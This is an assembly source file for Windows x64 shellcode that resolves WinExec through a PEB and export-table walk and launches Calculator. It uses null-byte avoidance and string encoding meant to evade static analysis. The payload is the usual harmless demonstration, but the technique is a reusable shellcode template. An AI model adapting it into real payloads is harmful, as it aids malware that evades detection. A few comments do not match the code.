;
; Spawns Calculator via WinExec, resolving API dynamically.
;
; Build:
;   nasm -f win64 -o exec_calc_dyn.o exec_calc_dyn.asm
;   x86_64-w64-mingw32-ld -o exec_calc_dyn.exe exec_calc_dyn.o
;
; Resources:
;   - https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode/blob/main/win-x64-DynamicKernelWinExecCalc.asm
;

section .text
    global main

main:
    xor rax, rax
    xor rdi, rdi

    ; Get kernel32.dll base address
    mov rbx, gs:[rbx+0x60]      ; PEB
    mov rbx, [rbx+0x18]         ; PEB->Ldr
    mov rbx, [rbx+0x20]         ; PEB->Ldr->InMemoryOrderModuleList (ntdll.dll)
    mov rbx, [rbx]              ; PEB->Ldr->InMemoryOrderModuleList (kernelbase.dll)
    mov rbx, [rbx]              ; PEB->Ldr->InMemoryOrderModuleList (kernel32.dll)
    mov rbx, [rbx+0x20]         ; (kernel32.dll)->DllBase
    mov r8, rbx

    ; Get kernel32.dll Export Table Address
    mov ebx, [rbx+0x3C]         ; ntHeadersOffset = ((PIMAGE_DOS_HEADER)&kernel32.dll)->e_lfanew
    add rbx, r8                 ; ntHeaders = &kernel32.dll + ntHeadersOffset
    xor rcx, rcx                ; Avoid null bytes from mov edx, [rbx+0x88] by using rcx register to add
    add cx, 0x88ff
    shr rcx, 0x8                ; 0x88ff -> 0x88
    mov edx, [rbx+rcx]          ; NtHeaders + RVA ExportTable
    add rdx, r8                 ; &kernel32.dll + RVA ExportTable

    ; Get &AddressTable from kernel32.dll ExportTable
    xor r10, r10
    mov r10d, [rdx+0x1C]        ; RVA AddressTable
    add r10, r8                 ; &AddressTable

    ; Get &NamePointerTable from kernel32.dll ExportTable
    xor r11, r11
    mov r11d, [rdx+0x20]        ; RVA NamePointerTable
    add r11, r8                 ; &NamePointerTable

    ; Get &OrdinalTable from kernel32.dll ExportTable
    xor r12, r12
    mov r12d, [rdx+0x24]        ; RVA OrdinalTable
    add r12, r8                 ; &OrdinalTable

    jmp short apis

; Get the address of the API from the kernel32.dll ExportTable
getapiaddr:
    pop rbx                     ; Save the return address for ret 2 caller after API address is found.
    pop rcx                     ; Get the string length counter from stack.
    xor rax, rax                ; Setup counter for resolving the API address after finding the name string
    mov rdx, rsp                ; Address of API Name String to match on the stack.
    push rcx                    ; Push the string length counter to stack.
.loop:
    mov rcx, [rsp]              ; Reset the string length counter from the stack.
    xor rdi, rdi                ; Clear RDI for setting up string name retrival
    mov edi, [r11+rax*4]        ; RVA NameString = [&NamePointerTable + (Counter * 4)]
    add rdi, r8                 ; &NameString = RVA NameString + &kernel32.dll
    mov rsi, rdx                ; Address of API Name String to match on the stack (reset to start of string)
    repe cmpsb                  ; Compare strings at RDI & RSI
    je resolveaddr              ; If match then we found the API string. Now we need to find the address of the API.
.inc_loop:
    inc rax
    jmp short .loop

; Find the address of GetProcAddress by using the last value of the Counter
resolveaddr:
    pop rcx                     ; Remove string length counter from top of stack
    mov ax, [r12+rax*2]         ; [&OrdianlTable + (Counter * 2)] = ordinalNumber of kernel32!<API>
    mov eax, [r10+rax*4]        ; RVA API = [&AddressTable + API OrdinalNumber]
    add rax, r8                 ; kernel32!<API> = RVA kernel32!<API> + kernel32.dll BaseAddress
    push rbx                    ; Place the return address from the api string call back on the top of the stack
    ret                         ; Return to API caller

; API names to resolve addresses
apis:                   ; API Names to resolve addresses
    ; WinExec | String length : 7
    xor rcx, rcx
    add cl, 0x7                 ; String length for compare string
    mov rax, 0x9C9A87BA9196A80F ; not 0x9C9A87BA9196A80F = 0xF0,WinExec 
    not rax ;mov rax, 0x636578456e6957F0 ; cexEniW,0xF0 : 636578456e6957F0 - Did Not to avoid WinExec returning from strings static analysis
    shr rax, 0x8                ; xEcoll,0xFFFF --> 0x0000,xEcoll
    push rax
    push rcx                    ; push the string length counter to stack
    call getapiaddr             ; Get the address of the API from Kernel32.dll ExportTable
    mov r14, rax                ; R14 = Kernel32.WinExec Address

    ; UINT WinExec(LPCSTR lpCmdLine, UINT uCmdShow);
    xor rcx, rcx
    mul rcx                     ; RAX & RDX & RCX = 0x0
    ; calc.exe | String length : 8
    push rax                    ; Null terminate string on stack
    mov rax, 0x9A879AD19C939E9C ; not 0x9A879AD19C939E9C = "calc.exe"
    not rax
    ;mov rax, 0x6578652e636c6163 ; exe.clac : 6578652e636c6163
    push rax                    ; RSP = "calc.exe",0x0
    mov rcx, rsp                ; RCX = "calc.exe",0x0
    inc rdx                     ; RDX = 0x1 = SW_SHOWNORMAL
    sub rsp, 0x20               ; WinExec clobbers first 0x20 bytes of stack (Overwrites our command string when proxied to CreatProcessA)
    call r14                    ; Call WinExec("calc.exe", SW_HIDE)

